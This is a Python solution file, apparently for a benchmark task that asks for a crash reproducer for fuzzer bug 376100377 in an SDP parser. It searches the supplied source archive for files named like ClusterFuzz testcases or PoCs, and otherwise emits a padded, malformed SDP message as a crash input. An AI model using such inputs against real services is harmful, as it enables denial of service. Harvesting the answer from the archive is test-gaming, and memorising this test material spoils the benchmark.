import os
import tarfile
import zipfile


class Solution:
    def __init__(self):
        self.bug_id = "376100377"
        self.desired_size = 873

    def solve(self, src_path: str) -> bytes:
        data = None

        try:
            if tarfile.is_tarfile(src_path):
                data = self._extract_from_tar(src_path)
            elif zipfile.is_zipfile(src_path):
                data = self._extract_from_zip(src_path)
            else:
                try:
                    with open(src_path, "rb") as f:
                        data = f.read()
                except Exception:
                    data = None
        except Exception:
            data = None

        if not data:
            data = self._fallback_poc()

        return data

    def _extract_from_tar(self, path: str) -> bytes:
        best_data = None
        best_score = None
        try:
            with tarfile.open(path, "r:*") as tf:
                for member in tf.getmembers():
                    if not member.isfile():
                        continue

                    name = member.name
                    lower = name.lower()
                    size = member.size

                    if self.bug_id in lower:
                        f = tf.extractfile(member)
                        if f is not None:
                            data = f.read()
                            if data:
                                return data

                    if size <= 0 or size > 1024 * 1024:
                        continue

                    score = self._score_name(lower, size, self.desired_size)

                    if best_score is None or score > best_score:
                        f = tf.extractfile(member)
                        if f is None:
                            continue
                        data = f.read()
                        if not data:
                            continue
                        best_score = score
                        best_data = data
        except tarfile.TarError:
            pass
        return best_data

    def _extract_from_zip(self, path: str) -> bytes:
        best_data = None
        best_score = None
        try:
            with zipfile.ZipFile(path, "r") as zf:
                for info in zf.infolist():
                    if info.is_dir():
                        continue

                    name = info.filename
                    lower = name.lower()
                    size = info.file_size

                    if self.bug_id in lower:
                        data = zf.read(info)
                        if data:
                            return data

                    if size <= 0 or size > 1024 * 1024:
                        continue

                    score = self._score_name(lower, size, self.desired_size)

                    if best_score is None or score > best_score:
                        data = zf.read(info)
                        if not data:
                            continue
                        best_score = score
                        best_data = data
        except zipfile.BadZipFile:
            pass
        return best_data

    def _score_name(self, lower_name: str, size: int, desired_size: int) -> int:
        score = 0
        keywords = {
            "clusterfuzz": 100,
            "testcase": 80,
            "minimized": 60,
            "crash": 50,
            "repro": 50,
            "poc": 50,
            "sdp": 20,
            "fuzz": 10,
            "bug": 10,
        }
        has_keyword = False
        for word, val in keywords.items():
            if word in lower_name:
                score += val
                has_keyword = True

        base = lower_name.rsplit("/", 1)[-1]
        if "." not in base:
            score += 5
            ext = ""
        else:
            parts = base.rsplit(".", 1)
            ext = parts[1]

        if ext in ("sdp", "poc", "bin", "raw", "data", "in", "cfg", "conf"):
            score += 10

        if desired_size is not None and size <= 10240:
            size_diff = abs(size - desired_size)
            size_score = 40 - size_diff // 10
            if size_score < 0:
                size_score = 0
            score += size_score
        else:
            if size > 10240:
                score -= 20

        if not has_keyword:
            score -= 100

        return score

    def _fallback_poc(self) -> bytes:
        target_size = self.desired_size
        prefix = (
            b"v=0\r\n"
            b"o=- 0 0 IN IP4 127.0.0.1\r\n"
            b"s=-\r\n"
            b"c=IN IP4 127.0.0.1\r\n"
            b"t=0 0\r\n"
            b"a="
        )
        if target_size is None:
            return prefix
        if len(prefix) >= target_size:
            return prefix[:target_size]
        return prefix + b"A" * (target_size - len(prefix))